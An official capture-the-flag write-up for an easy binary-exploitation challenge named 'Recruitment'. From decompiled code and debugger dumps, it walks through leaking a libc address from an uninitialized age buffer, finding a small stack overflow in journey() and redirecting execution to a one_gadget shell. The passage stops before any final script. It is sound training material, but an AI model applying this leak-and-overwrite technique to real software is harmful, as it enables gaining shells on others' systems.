![](../../assets/banner.png)



<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />        <font size="10">Recruitment</font>

​	21 Sept 2024 / Document No. D24.102.257

​	Prepared By: w3th4nds

​	Challenge Author(s): w3th4nds

​	Difficulty: <font color=green>Easy</font>

​	Classification: Official

 



# Synopsis

Recruitment is an easy difficulty challenge that features leaking a `libc address` from an uninitialized buffer and then perform `ret2libc` with `one_gadget` due to payload limitation.

# Description

In this long and arduous quest to retrieve The Starry Spurr, we seek only the most loyal and courageous young souls. If you have the strength and determination, come forth and join us on this epic journey!

## Skills Required

- Basic `C/C++` and stack understanding.

## Skills Learned

- Leak address from uninitialized buffer and perfrom `one_gadget`. 

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   | 
| :---:      | :---:    | :---:   |
| **Canary** | ❌       | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary | 
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program's interface 

```console
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒                    ▒
▒ 1. Create  Profile ▒
▒ 2. Display Profile ▒
▒ 3. Start   Journey ▒
▒                    ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

$ 3

[-] You need to set up your profile first!

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒                    ▒
▒ 1. Create  Profile ▒
▒ 2. Display Profile ▒
▒ 3. Start   Journey ▒
▒                    ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

$ 2

[!] Data: 

♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️

[*] Name:  N/A
[*] Class: N/A
[*] Age:   N/A

♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒                    ▒
▒ 1. Create  Profile ▒
▒ 2. Display Profile ▒
▒ 3. Start   Journey ▒
▒                    ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

$ 1

[*] You need to enter your Name, Class, and Age.

[+] Name:  w3t
[+] Class: h4nds
[+] Age:   69

[!] Data: 

♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️

[*] Name:  w3t
[*] Class: h4nds
[*] Age:   69


♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️♦️
```

There are 3 options:

* `Create Profile`
* `Display Profile`
* `Start Journey`

To access the 3rd one, we need to create a profile first.

```console
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒                    ▒
▒ 1. Create  Profile ▒
▒ 2. Display Profile ▒
▒ 3. Start   Journey ▒
▒                    ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

$ 3

[!] The fate of the Frontier Cluster lies on loyal and brave Space Cowpokes like you [ w3t ].
    We need you to tell us a bit about you so that we can assign to you your first mission: w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds w3th4nds 
[1]    17551 segmentation fault (core dumped)  ./recruitment
```

We can see that after creating a profile and then entering a couple of data, we get a `Segmentation Fault`, meaning we have overwritten the return address. Knowing that `PIE` and `Canary` are disabled, we need to do some things to get shell.

* Leak a `libc` address and calculate `libc base`.
* Find the overflow `offset`.
* Send `one_gadget` to get shell.

### Disassembly

Starting with `main()`:

```c
00402a7c  int32_t main(int32_t argc, char** argv, char** envp)

00402a7c  {
00402a96      void var_218;
00402a96      Profile::Profile(&var_218);
00402aa5      void var_288;
00402aa5      Profile::Profile(&var_288);
00402aa5      
00402ab3      while (flag != 3)
00402ab3      {
00402ab9          int64_t choice = menu();
00402ab9          
00402ac2          if (choice != 3)
00402ac2          {
00402ad6              if (choice == 1)
00402ad6              {
00402af0                  if (flag != 1)
00402af0                  {
00402b06                      int64_t* rax_3 = create_profile();
00402b17                      char* rbx_1 = rax_3[2];
00402b21                      void var_109;
00402b21                      void* var_28_1 = &var_109;
00402b46                      void var_138;
00402b46                      std::string::string<std::allocator<char> >(&var_138, rax_3[1]);
00402b52                      void var_d9;
00402b52                      void* var_30_1 = &var_d9;
00402b73                      void var_108;
00402b73                      std::string::string<std::allocator<char> >(&var_108, *(uint64_t*)rax_3);
00402b93                      void var_1a8;
00402b93                      Profile::Profile(&var_1a8, &var_108, &var_138, rbx_1);
00402bac                      Profile::operator=(&var_288, &var_1a8);
00402bbb                      Profile::~Profile(&var_1a8);
00402bca                      std::string::~string(&var_108);
00402be9                      std::string::~string(&var_138);
00402bfe                      continue;
00402af0                  }
00402af0                  else
00402af0                  {
00402afc                      error("You cannot create a second profi…");
00402b01                      continue;
00402af0                  }
00402ad6              }
00402ad6              else if (choice == 2)
00402adc              {
00402c0b                  if (flag != 0)
00402c0b                  {
00402caa                      void var_98;
00402caa                      std::string::string(&var_98);
00402cc0                      void var_78;
00402cc0                      std::string::string(&var_78);
00402ce5                      Profile::display(&var_288);
00402cf1                      std::string::~string(&var_78);
00402d00                      std::string::~string(&var_98);
00402d05                      continue;
00402c0b                  }
00402c0b                  else
00402c0b                  {
00402c29                      void var_d8;
00402c29                      std::string::string(&var_d8);
00402c42                      void var_b8;
00402c42                      std::string::string(&var_b8);
00402c6a                      Profile::display(&var_218);
00402c79                      std::string::~string(&var_b8);
00402c88                      std::string::~string(&var_d8);
00402c8d                      continue;
00402c0b                  }
00402adc              }
00402adc              
00402d5c              error("Invalid operation! Safety mechan…");
00402d66              exit(0x520);
00402d66              /* no return */
00402ac2          }
00402ac2          
00402d0f          if (flag != 0)
00402d0f          {
00402d33              void var_58;
00402d33              std::string::string(&var_58);
00402d3f              journey();
00402d4b              std::string::~string(&var_58);
00402d0f          }
00402d0f          else
00402d1b              error("You need to set up your profile …");
00402ab3      }
00402ab3      
00402d80      Profile::~Profile(&var_288);
00402d8f      Profile::~Profile(&var_218);
00402ea4      return 0;
00402a7c  }
```

Let's start with option 1 that calls `create_profile`.

```c
00402ad6              if (choice == 1)
00402ad6              {
00402af0                  if (flag != 1)
00402af0                  {
00402b06                      int64_t* rax_3 = create_profile();
```

```c
00402677  int64_t* create_profile()

00402677  {
0040268c      int64_t* result = operator new[](0x18);
0040268c      
004026c8      for (int32_t i = 0; i <= 2; i += 1)
004026af          result[((int64_t)i)] = operator new[](0x64);
004026af      
004026d1      void __str_1;
004026d1      std::string::string(&__str_1);
004026dd      void __str;
004026dd      std::string::string(&__str);
004026ec      fflush(__bss_start);
00402705      std::operator<<<std::char_traits<char> >(&std::cout, "\n[*] You need to enter your Nam…");
0040271b      std::getline<char>(&std::cin, &__str_1);
00402734      std::operator<<<std::char_traits<char> >(&std::cout, "[+] Class: ");
0040274a      std::getline<char>(&std::cin, &__str);
00402763      std::operator<<<std::char_traits<char> >(&std::cout, "[+] Age:   ");
0040277c      void age;
0040277c      read(0, &age, 0x20);
00402870      class std::ostream* rax_15 = std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::operator<<<std::char_traits<char> >(std::operator<<<char>(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::operator<<<std::char_traits<char> >(std::operator<<<char>(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(&std::cout, &data_404010), "\x1b[1;35m")), "\x1b[1;34m"), std::endl<char>), "[*] Class: "), "\x1b[1;33m")), "\x1b[1;34m"), std::endl<char>), "[*] Age:   "), &age);
004028a9      std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::ostream::operator<<(rax_15, std::endl<char>), std::endl<char>), &data_404128);
004028c7      *(uint8_t*)(&age + strcspn(&age, &data_40438f)) = 0;
004028d6      char* rax_19 = std::string::c_str(&__str_1);
004028eb      strcpy(*(uint64_t*)result, rax_19);
004028f7      char* rax_22 = std::string::c_str(&__str);
00402910      strcpy(result[1], rax_22);
0040292d      strcpy(result[2], &age);
00402932      flag = 1;
00402947      std::string::~string(&__str);
00402953      std::string::~string(&__str_1);
0040298c      return result;
00402677  }
```

We can see that after we enter our data, it prints the temp values of them before storing them in the Class Object.

```c
00402705      std::operator<<<std::char_traits<char> >(&std::cout, "\n[*] You need to enter your Nam…");
0040271b      std::getline<char>(&std::cin, &__str_1);
00402734      std::operator<<<std::char_traits<char> >(&std::cout, "[+] Class: ");
0040274a      std::getline<char>(&std::cin, &__str);
00402763      std::operator<<<std::char_traits<char> >(&std::cout, "[+] Age:   ");
0040277c      void age;
0040277c      read(0, &age, 0x20);
00402870      class std::ostream* rax_15 = std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::operator<<<std::char_traits<char> >(std::operator<<<char>(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::operator<<<std::char_traits<char> >(std::operator<<<char>(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(&std::cout, &data_404010), "\x1b[1;35m")), "\x1b[1;34m"), std::endl<char>), "[*] Class: "), "\x1b[1;33m")), "\x1b[1;34m"), std::endl<char>), "[*] Age:   "), &age);
```

The bug here is that the `age` buffer is not initialized with any data, meaning it might store junk and other addresses.

```c
0040277c      void age;
0040277c      read(0, &age, 0x20);
```

Knowing that, we can try to leak some useful addresses (libc). 

### Debugging 

Inside the debugger, we can see what lies in the address where we store the `age` input.

```gdb
pwndbg> x/20gx 0x7fffffffd930
0x7fffffffd930:	0x0a42424241414141	0x0000000000404220 // start of buffer
0x7fffffffd940:	0x00007fffffffd990	0x00007ffff7893bca // libc address
0x7fffffffd950:	0x2e78786362696c67	0x0000000000000110
0x7fffffffd960:	0x00007fffffffde58	0x00007ffff7a045c0
0x7fffffffd970:	0x0000000000000110	0x0000000000000110
0x7fffffffd980:	0x0000000000000001	0x0000000000404220
0x7fffffffd990:	0x00007fffffffd9e0	0x00007ffff7886a02
0x7fffffffd9a0:	0x0000000000012000	0x00007ffff7a02030
0x7fffffffd9b0:	0x0000000000400004	0x0000000000406080
0x7fffffffd9c0:	0x0000000000406088	0x0000000000000110
pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x407000           0x428000 rw-p    21000      0 [heap]
►   0x7ffff7800000     0x7ffff7828000 r--p    28000      0 /home/Recruitment/challenge/glibc/libc.so.6
```

We see that there is a `libc` address after `24` bytes. So, if we enter `23` bytes and the `\n` character (24 in total), we can leak a `libc` address.  We can calculate the `libc base` be subtracting the offset.

```gdb
pwndbg> p/x 0x00007ffff7893bca-0x7ffff7800000
$1 = 0x93bca
```

Now that we have our `libc base`, we need to find the `Buffer Overflow` and the offset. As we saw from the program's interface, the overflow lies in the `journey()` function.

```c
0040298d  std::istream::__istream_type* journey()

0040298d  {
0040299d      flag = 3;
00402a33      std::operator<<<std::char_traits<char> >(std::ostream::operator<<(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(std::operator<<<char>(std::operator<<<std::char_traits<char> >(std::operator<<<std::char_traits<char> >(&std::cout, "\x1b[1;32m\n[!] The fate of the …"), "\x1b[1;35m")), "\x1b[1;32m"), &data_404400), std::endl<char>), "    We need you to tell us a bit…");
00402a38      int64_t vuln_buf;
00402a38      __builtin_memset(&vuln_buf, 0, 0x20);
00402a7b      return std::istream::getline(&std::cin, &vuln_buf, 0x2f);
0040298d  }
```

The buffer is `0x20` bytes long and we can write up to `0x2f` bytes to it. The extra bytes are limited, but they will do the work. We just need to fill the buffer with `0x20` bytes + `8` for the `SFP` and then add the `libc_base` and `one_gadget` whose constraints are meant. The gadget that works is: 

```c
0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL
```

To verify this, we can take a look at the registers when the gadget is going to be called.
